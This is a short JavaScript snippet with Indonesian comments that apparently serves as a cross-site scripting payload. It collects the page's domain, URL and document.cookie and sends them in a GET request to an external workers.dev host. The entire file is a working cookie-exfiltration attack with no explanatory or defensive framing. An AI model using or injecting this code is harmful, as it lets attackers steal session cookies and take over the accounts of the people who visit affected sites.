(function() {
  var domain = document.domain;
  var url = window.location.href;
  var cookie = document.cookie;

  // Buat pesan, newline diganti %0A
  var message = "Domain: " + domain + "\nURL: " + url + "\nCookie: " + cookie;
  var safeMessage = message.replace(/\n/g, "%0A");

  // Kirim pakai fetch GET
  fetch("https://memek-worker.defoy89122.workers.dev/?message=" + safeMessage)
    .then(response => {
      console.log("Pesan terkirim:", response.status);
    })
    .catch(err => {
      console.error("Gagal kirim:", err);
    });
})();
